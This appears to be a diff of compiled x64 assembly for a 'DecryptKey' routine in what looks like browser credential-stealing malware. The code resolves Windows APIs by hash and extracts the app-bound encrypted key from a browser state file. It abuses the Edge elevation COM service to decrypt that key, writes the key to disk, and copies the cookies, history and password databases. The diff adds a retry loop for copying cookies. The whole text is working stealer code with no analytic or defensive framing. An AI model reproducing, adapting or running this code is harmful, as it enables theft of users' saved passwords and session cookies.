@@ -767,23 +771,23 @@ $LN9@DecryptKey:
 	mov	rdx, QWORD PTR tv735[rsp]
 	lea	rcx, QWORD PTR passwordFilename$[rsp]
 	call	?CopyStringA@@YA_NPEBDPEAD_K@Z		; CopyStringA
-; Line 550
+; Line 557
 	mov	DWORD PTR hashCreateFileA$[rsp], 896765632 ; 35738ec0H
-; Line 551
+; Line 558
 	mov	r8d, 896765632				; 35738ec0H
 	mov	rdx, QWORD PTR lpKernel32$[rsp]
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
 	mov	QWORD PTR pCreateFileA$[rsp], rax
-; Line 552
+; Line 559
 	cmp	QWORD PTR pCreateFileA$[rsp], 0
-	jne	SHORT $LN10@DecryptKey
+	jne	SHORT $LN13@DecryptKey
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 	jmp	$LN1@DecryptKey
-$LN10@DecryptKey:
-; Line 553
+$LN13@DecryptKey:
+; Line 560
 	mov	rax, QWORD PTR pCreateFileA$[rsp]
 	mov	QWORD PTR tv751[rsp], rax
 	mov	QWORD PTR [rsp+48], 0
@@ -795,48 +799,48 @@ $LN10@DecryptKey:
 	lea	rcx, QWORD PTR path$[rsp]
 	call	QWORD PTR tv751[rsp]
 	mov	QWORD PTR hFile$[rsp], rax
-; Line 554
+; Line 561
 	cmp	QWORD PTR hFile$[rsp], 0
-	jne	SHORT $LN11@DecryptKey
+	jne	SHORT $LN14@DecryptKey
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 	jmp	$LN1@DecryptKey
-$LN11@DecryptKey:
-; Line 557
+$LN14@DecryptKey:
+; Line 564
 	mov	DWORD PTR hashGetFileSize$[rsp], -1940020856 ; 8c5da188H
-; Line 558
+; Line 565
 	mov	r8d, -1940020856			; 8c5da188H
 	mov	rdx, QWORD PTR lpKernel32$[rsp]
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
 	mov	QWORD PTR pGetFileSize$[rsp], rax
-; Line 559
+; Line 566
 	cmp	QWORD PTR pGetFileSize$[rsp], 0
-	jne	SHORT $LN12@DecryptKey
+	jne	SHORT $LN15@DecryptKey
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 	jmp	$LN1@DecryptKey
-$LN12@DecryptKey:
-; Line 560
+$LN15@DecryptKey:
+; Line 567
 	mov	rax, QWORD PTR pGetFileSize$[rsp]
 	mov	QWORD PTR tv762[rsp], rax
 	xor	edx, edx
 	mov	rcx, QWORD PTR hFile$[rsp]
 	call	QWORD PTR tv762[rsp]
 	mov	DWORD PTR dwFileSize$[rsp], eax
-; Line 561
+; Line 568
 	cmp	DWORD PTR dwFileSize$[rsp], 0
-	jne	SHORT $LN13@DecryptKey
+	jne	SHORT $LN16@DecryptKey
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 	jmp	$LN1@DecryptKey
-$LN13@DecryptKey:
-; Line 563
+$LN16@DecryptKey:
+; Line 570
 	mov	QWORD PTR fileBuf$[rsp], 0
-; Line 564
+; Line 571
 	mov	eax, DWORD PTR dwFileSize$[rsp]
 	inc	eax
 	mov	eax, eax
@@ -845,30 +849,30 @@ $LN13@DecryptKey:
 	call	?AllocMemory@@YA_N_KPEAPEAX@Z		; AllocMemory
 	movzx	eax, al
 	test	eax, eax
-	jne	SHORT $LN14@DecryptKey
-; Line 565
+	jne	SHORT $LN17@DecryptKey
+; Line 572
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 	jmp	$LN1@DecryptKey
-$LN14@DecryptKey:
-; Line 575
+$LN17@DecryptKey:
+; Line 582
 	mov	DWORD PTR hashReadFile$[rsp], -1576683562 ; a205b7d6H
-; Line 576
+; Line 583
 	mov	r8d, -1576683562			; a205b7d6H
 	mov	rdx, QWORD PTR lpKernel32$[rsp]
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
 	mov	QWORD PTR pReadFile$[rsp], rax
-; Line 577
+; Line 584
 	cmp	QWORD PTR pReadFile$[rsp], 0
-	jne	SHORT $LN15@DecryptKey
+	jne	SHORT $LN18@DecryptKey
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 	jmp	$LN1@DecryptKey
-$LN15@DecryptKey:
-; Line 578
+$LN18@DecryptKey:
+; Line 585
 	mov	rax, QWORD PTR pReadFile$[rsp]
 	mov	QWORD PTR tv815[rsp], rax
 	mov	QWORD PTR [rsp+32], 0
@@ -878,35 +882,35 @@ $LN15@DecryptKey:
 	mov	rcx, QWORD PTR hFile$[rsp]
 	call	QWORD PTR tv815[rsp]
 	test	eax, eax
-	jne	SHORT $LN16@DecryptKey
-; Line 579
+	jne	SHORT $LN19@DecryptKey
+; Line 586
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 	jmp	$LN1@DecryptKey
-$LN16@DecryptKey:
-; Line 583
+$LN19@DecryptKey:
+; Line 590
 	mov	DWORD PTR hashCloseHandle$[rsp], 1729908677 ; 671c4fc5H
-; Line 584
+; Line 591
 	mov	r8d, 1729908677				; 671c4fc5H
 	mov	rdx, QWORD PTR lpKernel32$[rsp]
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
 	mov	QWORD PTR pCloseHandle$[rsp], rax
-; Line 585
+; Line 592
 	cmp	QWORD PTR pCloseHandle$[rsp], 0
-	jne	SHORT $LN17@DecryptKey
+	jne	SHORT $LN20@DecryptKey
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 	jmp	$LN1@DecryptKey
-$LN17@DecryptKey:
-; Line 587
+$LN20@DecryptKey:
+; Line 594
 	mov	rax, QWORD PTR pCloseHandle$[rsp]
 	mov	QWORD PTR tv825[rsp], rax
 	mov	rcx, QWORD PTR hFile$[rsp]
 	call	QWORD PTR tv825[rsp]
-; Line 589
+; Line 596
 	mov	BYTE PTR patternKey$[rsp], 97		; 00000061H
 	mov	BYTE PTR patternKey$[rsp+1], 112	; 00000070H
 	mov	BYTE PTR patternKey$[rsp+2], 112	; 00000070H
@@ -934,9 +938,9 @@ $LN17@DecryptKey:
 	mov	BYTE PTR patternKey$[rsp+24], 58	; 0000003aH
 	mov	BYTE PTR patternKey$[rsp+25], 34	; 00000022H
 	mov	BYTE PTR patternKey$[rsp+26], 0
-; Line 590
+; Line 597
 	mov	QWORD PTR keyPointer$[rsp], 0
-; Line 591
+; Line 598
 	lea	rcx, QWORD PTR patternKey$[rsp]
 	call	?StrLen@@YA_KPEAD@Z			; StrLen
 	mov	QWORD PTR tv867[rsp], rax
@@ -949,22 +953,22 @@ $LN17@DecryptKey:
 	call	?FindPatternA@@YA_NPEBD0_KPEAPEAD@Z	; FindPatternA
 	movzx	eax, al
 	test	eax, eax
-	jne	SHORT $LN18@DecryptKey
+	jne	SHORT $LN21@DecryptKey
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 	jmp	$LN1@DecryptKey
-$LN18@DecryptKey:
-; Line 592
+$LN21@DecryptKey:
+; Line 599
 	lea	rcx, QWORD PTR patternKey$[rsp]
 	call	?StrLen@@YA_KPEAD@Z			; StrLen
 	mov	rcx, QWORD PTR keyPointer$[rsp]
 	add	rcx, rax
 	mov	rax, rcx
 	mov	QWORD PTR keyPointer$[rsp], rax
-; Line 593
+; Line 600
 	mov	DWORD PTR sizeKeyB64$[rsp], 0
-; Line 594
+; Line 601
 	mov	DWORD PTR i$1[rsp], 0
 	jmp	SHORT $LN4@DecryptKey
 $LN2@DecryptKey:
@@ -972,96 +976,96 @@ $LN2@DecryptKey:
 	inc	eax
 	mov	DWORD PTR i$1[rsp], eax
 $LN4@DecryptKey:
-; Line 595
+; Line 602
 	movsxd	rax, DWORD PTR i$1[rsp]
 	mov	rcx, QWORD PTR keyPointer$[rsp]
 	movsx	eax, BYTE PTR [rcx+rax]
 	cmp	eax, 34					; 00000022H
-	jne	SHORT $LN19@DecryptKey
-; Line 596
+	jne	SHORT $LN22@DecryptKey
+; Line 603
 	movsxd	rax, DWORD PTR i$1[rsp]
 	mov	rcx, QWORD PTR keyPointer$[rsp]
 	mov	BYTE PTR [rcx+rax], 0
-; Line 597
+; Line 604
 	jmp	SHORT $LN3@DecryptKey
-$LN19@DecryptKey:
-; Line 599
+$LN22@DecryptKey:
+; Line 606
 	mov	eax, DWORD PTR i$1[rsp]
 	inc	eax
 	mov	DWORD PTR i$1[rsp], eax
-; Line 600
+; Line 607
 	mov	eax, DWORD PTR sizeKeyB64$[rsp]
 	inc	eax
 	mov	DWORD PTR sizeKeyB64$[rsp], eax
-; Line 601
+; Line 608
 	jmp	SHORT $LN2@DecryptKey
 $LN3@DecryptKey:
-; Line 608
+; Line 615
 	mov	DWORD PTR hashCoInitializeEx$[rsp], -731484482 ; d4666ebeH
-; Line 609
+; Line 616
 	mov	r8d, -731484482				; d4666ebeH
 	mov	rdx, QWORD PTR hOle32$[rsp]
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
 	mov	QWORD PTR pCoInitializeEx$[rsp], rax
-; Line 610
+; Line 617
 	cmp	QWORD PTR pCoInitializeEx$[rsp], 0
-	jne	SHORT $LN20@DecryptKey
-; Line 611
+	jne	SHORT $LN23@DecryptKey
+; Line 618
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 	jmp	$LN1@DecryptKey
-$LN20@DecryptKey:
-; Line 614
+$LN23@DecryptKey:
+; Line 621
 	mov	rax, QWORD PTR pCoInitializeEx$[rsp]
 	mov	QWORD PTR tv893[rsp], rax
 	mov	edx, 2
 	xor	ecx, ecx
 	call	QWORD PTR tv893[rsp]
 	mov	DWORD PTR hr$[rsp], eax
-; Line 615
+; Line 622
 	cmp	DWORD PTR hr$[rsp], 0
-	jge	SHORT $LN21@DecryptKey
-; Line 616
+	jge	SHORT $LN24@DecryptKey
+; Line 623
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 	jmp	$LN1@DecryptKey
-$LN21@DecryptKey:
-; Line 620
+$LN24@DecryptKey:
+; Line 627
 	mov	DWORD PTR hashCoUninitialize$[rsp], 691362315 ; 29355a0bH
-; Line 621
+; Line 628
 	mov	r8d, 691362315				; 29355a0bH
 	mov	rdx, QWORD PTR hOle32$[rsp]
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
 	mov	QWORD PTR pCoUninitialize$[rsp], rax
-; Line 622
+; Line 629
 	cmp	QWORD PTR pCoUninitialize$[rsp], 0
-	jne	SHORT $LN22@DecryptKey
+	jne	SHORT $LN25@DecryptKey
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 	jmp	$LN1@DecryptKey
-$LN22@DecryptKey:
-; Line 629
+$LN25@DecryptKey:
+; Line 636
 	mov	DWORD PTR hashCoCreateInstance$[rsp], -1213256403 ; b7af2d2dH
-; Line 630
+; Line 637
 	mov	r8d, -1213256403			; b7af2d2dH
 	mov	rdx, QWORD PTR hOle32$[rsp]
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
 	mov	QWORD PTR pCoCreateInstance$[rsp], rax
-; Line 631
+; Line 638
 	cmp	QWORD PTR pCoCreateInstance$[rsp], 0
-	jne	SHORT $LN23@DecryptKey
+	jne	SHORT $LN26@DecryptKey
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 	jmp	$LN1@DecryptKey
-$LN23@DecryptKey:
-; Line 632
+$LN26@DecryptKey:
+; Line 639
 	mov	rax, QWORD PTR pCoCreateInstance$[rsp]
 	mov	QWORD PTR tv944[rsp], rax
 	lea	rax, QWORD PTR pElevatorEdge$[rsp]
@@ -1072,34 +1076,34 @@ $LN23@DecryptKey:
 	lea	rcx, QWORD PTR EdgeCLSID$[rsp]
 	call	QWORD PTR tv944[rsp]
 	mov	DWORD PTR hr$[rsp], eax
-; Line 640
+; Line 647
 	cmp	DWORD PTR hr$[rsp], 0
-	jge	SHORT $LN24@DecryptKey
-; Line 641
+	jge	SHORT $LN27@DecryptKey
+; Line 648
 	call	QWORD PTR pCoUninitialize$[rsp]
-; Line 642
+; Line 649
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 	jmp	$LN1@DecryptKey
-$LN24@DecryptKey:
-; Line 656
+$LN27@DecryptKey:
+; Line 663
 	mov	DWORD PTR hashCoSetProxyBlanket$[rsp], 1618607058 ; 6079fbd2H
-; Line 657
+; Line 664
 	mov	r8d, 1618607058				; 6079fbd2H
 	mov	rdx, QWORD PTR hOle32$[rsp]
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
 	mov	QWORD PTR pCoSetProxyBlanket$[rsp], rax
-; Line 658
+; Line 665
 	cmp	QWORD PTR pCoSetProxyBlanket$[rsp], 0
-	jne	SHORT $LN25@DecryptKey
+	jne	SHORT $LN28@DecryptKey
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 	jmp	$LN1@DecryptKey
-$LN25@DecryptKey:
-; Line 659
+$LN28@DecryptKey:
+; Line 666
 	mov	rax, QWORD PTR pCoSetProxyBlanket$[rsp]
 	mov	QWORD PTR tv961[rsp], rax
 	mov	DWORD PTR [rsp+56], 64			; 00000040H
@@ -1112,18 +1116,18 @@ $LN25@DecryptKey:
 	mov	rcx, QWORD PTR pElevatorEdge$[rsp]
 	call	QWORD PTR tv961[rsp]
 	mov	DWORD PTR hr$[rsp], eax
-; Line 670
+; Line 677
 	mov	QWORD PTR decryptedDataBSTR$[rsp], 0
-; Line 671
+; Line 678
 	mov	DWORD PTR dwLastError$[rsp], 0
-; Line 672
+; Line 679
 	mov	DWORD PTR length$[rsp], 0
-; Line 673
+; Line 680
 	lea	rdx, QWORD PTR length$[rsp]
 	mov	rcx, QWORD PTR keyPointer$[rsp]
 	call	?Base64Decode@@YAPEADPEBDAEAH@Z		; Base64Decode
 	mov	QWORD PTR encKey$[rsp], rax
-; Line 674
+; Line 681
 	mov	BYTE PTR sOleAut32$[rsp], 79		; 0000004fH
 	mov	BYTE PTR sOleAut32$[rsp+1], 108		; 0000006cH
 	mov	BYTE PTR sOleAut32$[rsp+2], 101		; 00000065H
@@ -1137,69 +1141,69 @@ $LN25@DecryptKey:
 	mov	BYTE PTR sOleAut32$[rsp+10], 108	; 0000006cH
 	mov	BYTE PTR sOleAut32$[rsp+11], 108	; 0000006cH
 	mov	BYTE PTR sOleAut32$[rsp+12], 0
-; Line 675
+; Line 682
 	mov	rax, QWORD PTR pLoadLibraryA$[rsp]
 	mov	QWORD PTR tv968[rsp], rax
 	lea	rcx, QWORD PTR sOleAut32$[rsp]
 	call	QWORD PTR tv968[rsp]
 	mov	QWORD PTR hOleAut32$[rsp], rax
-; Line 676
+; Line 683
 	cmp	QWORD PTR hOleAut32$[rsp], 0
-	jne	SHORT $LN26@DecryptKey
-	lea	rcx, QWORD PTR apiResolve$[rsp]
-	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
-	npad	1
-	jmp	$LN1@DecryptKey
-$LN26@DecryptKey:
-; Line 679
-	mov	DWORD PTR hashSysAllocStringByteLen$[rsp], -985302606 ; c54579b2H
-; Line 680
-	mov	r8d, -985302606				; c54579b2H
-	mov	rdx, QWORD PTR hOleAut32$[rsp]
-	lea	rcx, QWORD PTR apiResolve$[rsp]
-	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
-	mov	QWORD PTR pSysAllocStringByteLen$[rsp], rax
-; Line 681
-	cmp	QWORD PTR pSysAllocStringByteLen$[rsp], 0
-	jne	SHORT $LN27@DecryptKey
-	lea	rcx, QWORD PTR apiResolve$[rsp]
-	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
-	npad	1
-	jmp	$LN1@DecryptKey
-$LN27@DecryptKey:
-; Line 684
-	mov	DWORD PTR hashSysStringByteLen$[rsp], 1739000677 ; 67a70b65H
-; Line 685
-	mov	r8d, 1739000677				; 67a70b65H
-	mov	rdx, QWORD PTR hOleAut32$[rsp]
-	lea	rcx, QWORD PTR apiResolve$[rsp]
-	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
-	mov	QWORD PTR pSysStringByteLen$[rsp], rax
-; Line 686
-	cmp	QWORD PTR pSysStringByteLen$[rsp], 0
-	jne	SHORT $LN28@DecryptKey
-	lea	rcx, QWORD PTR apiResolve$[rsp]
-	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
-	npad	1
-	jmp	$LN1@DecryptKey
-$LN28@DecryptKey:
-; Line 689
-	mov	DWORD PTR hashSysFreeString$[rsp], 2140232812 ; 7f915c6cH
-; Line 690
-	mov	r8d, 2140232812				; 7f915c6cH
-	mov	rdx, QWORD PTR hOleAut32$[rsp]
-	lea	rcx, QWORD PTR apiResolve$[rsp]
-	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
-	mov	QWORD PTR pSysFreeString$[rsp], rax
-; Line 691
-	cmp	QWORD PTR pSysFreeString$[rsp], 0
 	jne	SHORT $LN29@DecryptKey
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 	jmp	$LN1@DecryptKey
 $LN29@DecryptKey:
+; Line 686
+	mov	DWORD PTR hashSysAllocStringByteLen$[rsp], -985302606 ; c54579b2H
+; Line 687
+	mov	r8d, -985302606				; c54579b2H
+	mov	rdx, QWORD PTR hOleAut32$[rsp]
+	lea	rcx, QWORD PTR apiResolve$[rsp]
+	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
+	mov	QWORD PTR pSysAllocStringByteLen$[rsp], rax
+; Line 688
+	cmp	QWORD PTR pSysAllocStringByteLen$[rsp], 0
+	jne	SHORT $LN30@DecryptKey
+	lea	rcx, QWORD PTR apiResolve$[rsp]
+	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
+	npad	1
+	jmp	$LN1@DecryptKey
+$LN30@DecryptKey:
+; Line 691
+	mov	DWORD PTR hashSysStringByteLen$[rsp], 1739000677 ; 67a70b65H
 ; Line 692
+	mov	r8d, 1739000677				; 67a70b65H
+	mov	rdx, QWORD PTR hOleAut32$[rsp]
+	lea	rcx, QWORD PTR apiResolve$[rsp]
+	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
+	mov	QWORD PTR pSysStringByteLen$[rsp], rax
+; Line 693
+	cmp	QWORD PTR pSysStringByteLen$[rsp], 0
+	jne	SHORT $LN31@DecryptKey
+	lea	rcx, QWORD PTR apiResolve$[rsp]
+	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
+	npad	1
+	jmp	$LN1@DecryptKey
+$LN31@DecryptKey:
+; Line 696
+	mov	DWORD PTR hashSysFreeString$[rsp], 2140232812 ; 7f915c6cH
+; Line 697
+	mov	r8d, 2140232812				; 7f915c6cH
+	mov	rdx, QWORD PTR hOleAut32$[rsp]
+	lea	rcx, QWORD PTR apiResolve$[rsp]
+	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
+	mov	QWORD PTR pSysFreeString$[rsp], rax
+; Line 698
+	cmp	QWORD PTR pSysFreeString$[rsp], 0
+	jne	SHORT $LN32@DecryptKey
+	lea	rcx, QWORD PTR apiResolve$[rsp]
+	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
+	npad	1
+	jmp	$LN1@DecryptKey
+$LN32@DecryptKey:
+; Line 699
 	mov	rax, QWORD PTR pSysAllocStringByteLen$[rsp]
 	mov	QWORD PTR tv991[rsp], rax
 	mov	eax, DWORD PTR length$[rsp]
@@ -1209,7 +1213,7 @@ $LN29@DecryptKey:
 	mov	edx, eax
 	call	QWORD PTR tv991[rsp]
 	mov	QWORD PTR bstrEncKey$[rsp], rax
-; Line 693
+; Line 700
 	mov	rax, QWORD PTR pElevatorEdge$[rsp]
 	mov	rax, QWORD PTR [rax]
 	mov	rax, QWORD PTR [rax+64]
@@ -1220,44 +1224,44 @@ $LN29@DecryptKey:
 	mov	rcx, QWORD PTR pElevatorEdge$[rsp]
 	call	QWORD PTR tv1032[rsp]
 	mov	DWORD PTR hr$[rsp], eax
-; Line 694
+; Line 701
 	cmp	QWORD PTR bstrEncKey$[rsp], 0
-	je	SHORT $LN30@DecryptKey
-; Line 695
+	je	SHORT $LN33@DecryptKey
+; Line 702
 	mov	rax, QWORD PTR pSysFreeString$[rsp]
 	mov	QWORD PTR tv1036[rsp], rax
 	mov	rcx, QWORD PTR bstrEncKey$[rsp]
 	call	QWORD PTR tv1036[rsp]
 	npad	1
-$LN30@DecryptKey:
-; Line 698
+$LN33@DecryptKey:
+; Line 705
 	cmp	DWORD PTR hr$[rsp], 0
-	jge	SHORT $LN31@DecryptKey
-; Line 699
+	jge	SHORT $LN34@DecryptKey
+; Line 706
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 	jmp	$LN1@DecryptKey
-; Line 700
-	jmp	$LN32@DecryptKey
-$LN31@DecryptKey:
-; Line 709
-	mov	DWORD PTR hashWriteFile$6[rsp], -339353823 ; ebc5df21H
-; Line 710
+; Line 707
+	jmp	$LN35@DecryptKey
+$LN34@DecryptKey:
+; Line 716
+	mov	DWORD PTR hashWriteFile$8[rsp], -339353823 ; ebc5df21H
+; Line 717
 	mov	r8d, -339353823				; ebc5df21H
 	mov	rdx, QWORD PTR lpKernel32$[rsp]
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
 	mov	QWORD PTR pWriteFile$4[rsp], rax
-; Line 711
+; Line 718
 	cmp	QWORD PTR pWriteFile$4[rsp], 0
-	jne	SHORT $LN33@DecryptKey
+	jne	SHORT $LN36@DecryptKey
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 	jmp	$LN1@DecryptKey
-$LN33@DecryptKey:
-; Line 715
+$LN36@DecryptKey:
+; Line 722
 	mov	rax, QWORD PTR pCreateFileA$[rsp]
 	mov	QWORD PTR tv1052[rsp], rax
 	mov	QWORD PTR [rsp+48], 0
@@ -1268,8 +1272,8 @@ $LN33@DecryptKey:
 	mov	edx, 1073741824				; 40000000H
 	lea	rcx, QWORD PTR keyPath$[rsp]
 	call	QWORD PTR tv1052[rsp]
-	mov	QWORD PTR hFile$3[rsp], rax
-; Line 716
+	mov	QWORD PTR hFile$5[rsp], rax
+; Line 723
 	mov	rax, QWORD PTR pWriteFile$4[rsp]
 	mov	QWORD PTR tv1068[rsp], rax
 	mov	rax, QWORD PTR pSysStringByteLen$[rsp]
@@ -1283,64 +1287,100 @@ $LN33@DecryptKey:
 	xor	r9d, r9d
 	mov	r8d, DWORD PTR tv1066[rsp]
 	mov	rdx, QWORD PTR tv1064[rsp]
-	mov	rcx, QWORD PTR hFile$3[rsp]
+	mov	rcx, QWORD PTR hFile$5[rsp]
 	call	QWORD PTR tv1068[rsp]
-; Line 718
-	mov	DWORD PTR hashCopyFileA$5[rsp], 528854519 ; 1f85adf7H
-; Line 724
+; Line 725
+	mov	DWORD PTR hashCopyFileA$6[rsp], 528854519 ; 1f85adf7H
+; Line 731
 	mov	r8d, 528854519				; 1f85adf7H
 	mov	rdx, QWORD PTR lpKernel32$[rsp]
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
-	mov	QWORD PTR pCopyFileA$2[rsp], rax
-; Line 725
-	cmp	QWORD PTR pCopyFileA$2[rsp], 0
-	jne	SHORT $LN34@DecryptKey
+	mov	QWORD PTR pCopyFileA$3[rsp], rax
+; Line 732
+	cmp	QWORD PTR pCopyFileA$3[rsp], 0
+	jne	SHORT $LN37@DecryptKey
 	lea	rcx, QWORD PTR apiResolve$[rsp]
 	call	??1ApiResolve@@QEAA@XZ			; ApiResolve::~ApiResolve
 	npad	1
 	jmp	$LN1@DecryptKey
-$LN34@DecryptKey:
-; Line 730
+$LN37@DecryptKey:
+; Line 737
+	mov	DWORD PTR hashSleep$7[rsp], 1231028136	; 495fffa8H
+; Line 739
+	mov	r8d, 1231028136				; 495fffa8H
+	mov	rdx, QWORD PTR lpKernel32$[rsp]
+	lea	rcx, QWORD PTR apiResolve$[rsp]
+	call	?GetApiAddress@ApiResolve@@QEAAPEAXPEAXI@Z ; ApiResolve::GetApiAddress
+	mov	QWORD PTR pSleep$9[rsp], rax
+; Line 740
 	lea	rdx, QWORD PTR cookiesPath$[rsp]
 	lea	rcx, QWORD PTR orCookiesPath$[rsp]
 	call	?CreateCopyFile@@YA_NPEAD0@Z		; CreateCopyFile
-	npad	1
-; Line 735
-	mov	rax, QWORD PTR pCopyFileA$2[rsp]
-	mov	QWORD PTR tv1080[rsp], rax
+	movzx	eax, al
+	test	eax, eax
+	je	$LN38@DecryptKey
+; Line 741
+	mov	DWORD PTR i$2[rsp], 0
+	jmp	SHORT $LN7@DecryptKey
+$LN5@DecryptKey:
+	mov	eax, DWORD PTR i$2[rsp]
+	inc	eax
+	mov	DWORD PTR i$2[rsp], eax
+$LN7@DecryptKey:
+	cmp	DWORD PTR i$2[rsp], 1000		; 000003e8H
+	jge	SHORT $LN6@DecryptKey
+; Line 742
+	mov	rax, QWORD PTR pCopyFileA$3[rsp]
+	mov	QWORD PTR tv1089[rsp], rax
+	xor	r8d, r8d
+	lea	rdx, QWORD PTR cookiesPath$[rsp]
+	lea	rcx, QWORD PTR orCookiesPath$[rsp]
+	call	QWORD PTR tv1089[rsp]
+	test	eax, eax
+	je	SHORT $LN39@DecryptKey
+; Line 743
+	jmp	SHORT $LN6@DecryptKey
+$LN39@DecryptKey:
+; Line 745
+	jmp	SHORT $LN5@DecryptKey
+$LN6@DecryptKey:
+; Line 747
+	mov	rax, QWORD PTR pCopyFileA$3[rsp]
+	mov	QWORD PTR tv1096[rsp], rax
 	xor	r8d, r8d
 	lea	rdx, QWORD PTR historyPath$[rsp]
 	lea	rcx, QWORD PTR orHistoryPath$[rsp]
-	call	QWORD PTR tv1080[rsp]
-; Line 739
-	mov	rax, QWORD PTR pCopyFileA$2[rsp]
-	mov	QWORD PTR tv1087[rsp], rax
+	call	QWORD PTR tv1096[rsp]
+; Line 751
+	mov	rax, QWORD PTR pCopyFileA$3[rsp]
+	mov	QWORD PTR tv1103[rsp], rax
 	xor	r8d, r8d
 	lea	rdx, QWORD PTR passwordPath$[rsp]
 	lea	rcx, QWORD PTR orPasswordPath$[rsp]
-	call	QWORD PTR tv1087[rsp]
-; Line 747
+	call	QWORD PTR tv1103[rsp]
+$LN38@DecryptKey:
+; Line 766
 	mov	rax, QWORD PTR pSysFreeString$[rsp]
-	mov	QWORD PTR tv1091[rsp], rax
+	mov	QWORD PTR tv1107[rsp], rax
 	mov	rcx, QWORD PTR decryptedDataBSTR$[rsp]
-	call	QWORD PTR tv1091[rsp]
-; Line 748
+	call	QWORD PTR tv1107[rsp]
+; Line 767
 	mov	rax, QWORD PTR pCloseHandle$[rsp]
-	mov	QWORD PTR tv1095[rsp], rax
-	mov	rcx, QWORD PTR hFile$3[rsp]
-	call	QWORD PTR tv1095[rsp]
+	mov	QWORD PTR tv1111[rsp], rax
+	mov	rcx, QWORD PTR hFile$5[rsp]
+	call	QWORD PTR tv1111[rsp]
 	npad	1
-$LN32@DecryptKey:
-; Line 751
+$LN35@DecryptKey:
+; Line 770
 	mov	rcx, QWORD PTR fileBuf$[rsp]
